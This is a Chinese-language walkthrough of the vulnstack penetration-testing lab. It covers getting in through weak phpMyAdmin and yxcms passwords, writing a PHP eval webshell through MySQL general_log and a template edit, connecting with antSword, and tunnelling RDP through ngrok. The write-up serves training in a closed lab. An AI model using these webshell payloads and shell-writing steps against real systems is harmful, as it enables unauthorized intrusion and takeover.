vulstack

环境

网络拓扑

  • VM1： vulnstack-win7
  • VM2： vulnstack-Win2K3 Metasploitable
  • VM3： vulnstack-winserver08

Vmware

All use hostOnly mode to simulate the intranet environment !

  • Kali : VMnet1(192.168.54.2)
  • Vm1: VMnet1(192.168.54.3) + VMnet2(192.168.72.104)
  • VM2: VMnet2(192.168.72.103)
  • VM3: VMnet2(192.168.72.102)

需要登陆分别设置IP，统一密码：hongrisec@2019

注意：这里需要手动开启 win7 的 phpStudy ！

资产

IP 发现

获取到目标入口 ip 地址：192.168.54.3

端口探测

资源探测

发现 phpmyadmin 后台、beifen.rar 备份文件、phpinfo.php 、l.php 探针

打点

phpMyadmin

1）使用 root/root 弱口令登陆

2） 通过 phpinfo.php 或l.php 得知绝对路径：C:\phpStudy\WWW

3） 查看是否可写 shell

  1. 导出写 shell ：show variables like ‘%secure%’ , secure_file_priv 值为NULL,不可写

  2. 日志写 shell ：show variables like ‘%general%’;general_log 为 off ，尝试开启并指定目录

4）写 shell ：select '<?php eval($_POST["cmd"]);?>',再设置 general_log 为 off

5）antSword 连接

当前是 administrator 权限 。

yxcms

注意到网站根目录下还存在 yxcms ，也可对其 Getshell

  1. 弱口令：admin、123456
  2. 后台：http://192.168.54.3/yxcms/index.php?r=admin/index/login
  3. 模板文件 index_index.php 写shell：<?php eval($_POST["cmd"]);?>
  4. antSword 连接：http://192.168.54.3/yxcms/index.php

内网

远程登陆

当前主机是windows，尝试连接远程桌面，查看3389是否开启，无回显，即未开启，使用以下命令开启（win7、win2003、winxp）

添加用户并尝试连接，登陆失败，Nmap扫描结果为 filtered ，查看 win7 防火墙设置了白名单

此时思路一般如下：

  1. 反弹 meterpreter ，尝试关闭防火墙
  2. 尝试使用隧道连接 3389

隧道连接

使用 ngrok 进行隧道连接，官网：https://www.ngrok.cc/

选择隧道管理 —> 开通隧道 —> 选择一个服务器（frp或者ngrok）—> 开通隧道并获得一个隧道id —> 下载客户端 —> 打开客户端启动工具 —> 输入隧道id —> 本地远程登录

开通完成后下载客户端，填写自己的隧道id，使用代理地址新建远程桌面，使用新建用户 test 登陆，到此为止
